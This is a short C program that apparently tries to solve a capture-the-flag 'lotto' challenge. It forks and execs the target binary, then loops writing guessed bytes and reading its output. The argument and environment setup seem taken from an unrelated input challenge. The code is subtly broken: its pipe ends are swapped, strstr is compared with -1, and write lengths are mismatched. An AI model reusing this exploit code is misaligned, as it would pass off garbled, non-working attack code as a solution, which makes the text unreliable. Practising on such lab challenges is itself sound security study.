#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main () {
    char *argv[101] = {[0 ... 99] = "A"};
    argv['A'] = "\x00";
    argv['B'] = "\x20\x0a\x0d";
    argv['C'] = "22222";
    char *envp[2] = {"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"};

    int pipe1[2], pipe2[2];
    if(pipe(pipe1)==-1 || pipe(pipe2)==-1) {
        printf("error pipe\n");
        exit(1);
    }

    if(fork() == 0) {
        dup2(pipe1[0], 0);
        close(pipe1[0]);
        close(pipe1[1]);

        dup2(pipe2[0], 1);
        close(pipe2[0]);
        close(pipe2[1]);

        execve("/home/lotto/lotto", argv, envp);
    }
    else {
        while (1) {
            write(pipe1[1], "\x01\x01\x01\x01\x01\x01", 4);
            char buff[100];
            int len_t = read(pipe2[1], buff, 100);
            buff[len_t] = '\x00';
            printf("%d, %s\n", strlen(buff), buff);
            if (strstr(buff, "bad luck...") == -1) {
                break;
            }
        }
        return 0;
    }
}